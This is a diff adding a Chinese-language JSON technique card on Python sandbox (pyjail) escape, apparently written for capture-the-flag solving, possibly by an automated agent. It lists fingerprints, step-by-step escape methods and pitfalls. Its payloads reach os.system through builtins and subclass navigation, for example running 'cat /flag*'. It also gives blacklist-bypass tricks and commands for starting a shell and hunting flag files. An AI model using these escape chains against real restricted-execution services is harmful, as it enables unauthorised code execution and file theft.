@@ -1,0 +1,71 @@
+{
+  "id": "pyjail-escape",
+  "title": "Python 沙箱逃逸（pyjail）",
+  "vuln_pattern": "受限 eval/exec 环境，绕过黑名单从内建/对象图取回 os.system/读文件",
+  "fingerprint": [
+    "在线python",
+    "python代码执行",
+    "代码执行服务",
+    "在线代码编辑",
+    "代码编辑器",
+    "在线执行",
+    "沙箱执行",
+    "代码沙箱",
+    "脚本执行沙箱",
+    "安全过滤机制",
+    "pyjail",
+    "sandbox",
+    "eval(",
+    "exec(",
+    "在线代码执行",
+    "逃逸",
+    "restricted",
+    "blacklist",
+    "builtins",
+    "字符集白名单",
+    "charset whitelist",
+    "双重eval",
+    "double eval",
+    "符号白名单"
+  ],
+  "exploit_steps": [
+    "枚举限制：哪些字符/关键字被禁(import/os/./_/引号/空格)、builtins 是否被清",
+    "从对象图找 gadget：().__class__.__base__.__subclasses__() 里找到含 os/popen 的类；或用 __import__",
+    "字符受限时用等价构造：getattr、chr()拼接、[].__class__、f-string、八进制/unicode 转义绕过黑名单",
+    "【builtins 被清空时的逃逸只能用纯对象导航——不许调用任何内建函数】：outer 环境 __builtins__={} 时,hasattr/type/isinstance/str/len/print 全都不存在,你的筛选/逃逸表达式里一旦出现它们就 NameError 当场死。合法动作只有:属性取用(.__class__/.__globals__/.__builtins__)、下标([...])、比较(==)、方法调用、推导式。要从子类里挑目标类,用 `if x.__name__==\"目标\"` 这种纯属性+比较的谓词,别用 hasattr/type 去做类型判断。取到真 builtins 的通路本身也全是导航:某 py 函数.__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(...) 或 catch_warnings 实例._module.__builtins__[\"__import__\"]。",
+    "【别把逃逸赌在单个子类名上——子类名会因 Python 版本或是否 import 而消失】：catch_warnings 只有在 warnings 被 import 时才在 subclasses 里,某些版本/最小运行环境根本没有,硬编码它会静默 IndexError([0] 取空表)。更稳的锚点是 site.py 必加载的类(如 _sitebuiltins.Quitter / _Printer,只要不是 python -S 起的就在),它们的 .__init__.__globals__[\"__builtins__\"] 就是真 builtins 字典。做法:准备 2-3 个候选类名,逐个试到有回显为止,而不是认准一个。",
+    "字符受限(如只放行十几个符号+个别字母)时,用 `f\"{N:c}\"` 作万能字符工厂:只要白名单含 f \" { } : c,再能造出任意整数 N 就能产出任意字符(含被禁的 _ . [ ] ' 字母 空格)。整数用布尔算术拼:(x==x)=1、(x>x)=0,配白名单的 + * 做二进制 Horner 即可造任意 N。内层 eval 由此产出任意目标字符串 S,外层 eval 执行 S。",
+    "payload 太长顶到字符上限时,用海象 := 把高频子表达式(1/0/2 等)预定义成单字符变量再复用(变量名只能用白名单里的字母,如 g c t),可把 int 编码整体缩小数倍,腾出预算给更稳的逃逸链。用 `(名:=值)*\"\"` 求值成空串顺带完成定义,便于拼进字符串。",
+    "取到执行原语后:先 `sh` 起交互 shell 或直接 system(命令),再按 [[source-code-hunting]] 就地定位真 flag(cat flag* + find -iname 'flag*' + grep -rlI 'flag{')——别只 cat 源码里那个占位 flag.txt"
+  ],
+  "key_payloads": [
+    "().__class__.__bases__[0].__subclasses__()  # 枚举可用类",
+    "__import__('os').system('cat /flag*')",
+    "getattr(__import__('os'),'system')('id')  # 绕点号/名字过滤",
+    "[c for c in ().__class__.__base__.__subclasses__() if 'popen' in str(c).lower()]",
+    "# 纯符号构造字符串(无字母无引号时的思路示例)\n# '\"'()*+/:=> 等符号经算术/比较/重复得到 chr 或布尔, 再乘出整条 payload 串\n# 双重 eval: 内层算出字符串字面量 -> 外层 eval 执行之"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "misc",
+    "pyjail",
+    "sandbox-escape",
+    "evasion"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "能提交被 eval/exec 的 Python 片段，但有字符/名字黑名单或删了 builtins"
+  ],
+  "verify_oracle": "flag 内容/命令回显出现在输出；或成功列出含 popen/os 的子类",
+  "pitfalls": [
+    "subclasses() 索引随版本变——用过滤而非硬编码索引",
+    "把逃逸赌在单个子类名(catch_warnings 等)上=高发静默失败:该名只在对应模块被 import 时才在 subclasses 里,版本/最小环境下缺席就 [0] 取空表 IndexError,且 socat EXEC 默认不把 stderr 送回 socket,你只会看到 0 字节+断开、以为'没打通'。改用 site 必加载的锚点(_sitebuiltins.Quitter/_Printer)或多备候选名逐个试",
+    "outer builtins 被清空({})时,逃逸表达式里用了 hasattr/type/isinstance/str/len 等内建=当场 NameError:空 builtins 环境只能纯对象导航(属性/下标/==/方法调用/推导式),类型判断改用 `x.__name__==\"...\"`",
+    "禁了引号用 chr()/bytes 构造；禁了下划线用 getattr 链",
+    "builtins 被删可从 frame/generator 找回",
+    "字符集白名单(只允许极少符号字符)+双重 eval:内层 eval 只需产出一个字符串、外层 eval 才执行——白名单含 f \" { } : c 时首选 `f\"{N:c}\"` 造任意字符((x==x)=1/(x>x)=0 配 +* 造 N),比纯乘法拼串通用;40000 字符上限就是给你拼长串用的,顶到上限用海象 := 预定义 1/0/2 压缩;别找字母,白名单里没有",
+    "打通后只 cat 源码里的 flag.txt/占位常量就交=可能是原版占位(如非平台格式的原版占位 flag),平台部署常把它轮换成新值:起 shell 后 find/grep 现网真文件再交(见 [[source-code-hunting]])"
+  ]
+}
